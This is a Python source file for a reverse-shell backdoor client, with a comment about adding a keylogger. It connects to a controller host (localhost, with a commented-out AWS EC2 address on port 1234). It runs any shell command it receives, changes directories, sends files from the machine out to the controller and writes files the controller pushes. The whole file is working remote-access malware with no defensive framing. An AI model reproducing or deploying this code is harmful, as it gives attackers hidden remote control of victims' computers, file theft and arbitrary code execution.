#To add the feature of KeyLogger
import socket
import os
import re
import subprocess

def transfer(s, filename):
    f = open(filename,"rb")
    while True:
        bits = f.read(1024)
        s.send(bits)
        if bits == b'':
            s.send("DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042".encode())
            break
    f.close()

def get(s, filename):
    f = open(filename, 'wb')
    while True:
        bits = s.recv(1024)
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    f.close()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 1234
#s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
s.connect(('127.0.0.1',port))
s.send(os.getcwd().encode())
while True:
    res = s.recv(2048).decode()
    res = res.lower()
    temp = res.split(" ")
    if temp[0] == 'cd':
        if temp[1] == '..':
            cwd = os.getcwd()
            cwd = cwd.split("\\")
            tcwd = ""
            for i in range(len(cwd)-1):
                tcwd += cwd[i] + "\\"
            os.chdir(tcwd)
            s.send((os.getcwd() + ">").encode())
            s.send("Directory Changed...".encode())
        else:
            res = re.findall("cd (.+)", res)
            os.chdir(res[0])
            s.send((os.getcwd() + ">").encode())
            s.send("Directory Changed...".encode())
    elif res == "exit":
        break
    elif 'get*' in res or 'cat' in res:
        transfer(s, res.split("*")[1])
        continue
    elif 'upload*' in res:
        get(s, res.split("*")[2])
        continue
    else:
        s.send((os.getcwd() + ">").encode())
        res = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        t = res.stdout.read().decode()
        if t == "":
            s.send("Command Executed....".encode())
            continue
        s.send(t.encode())
s.close()
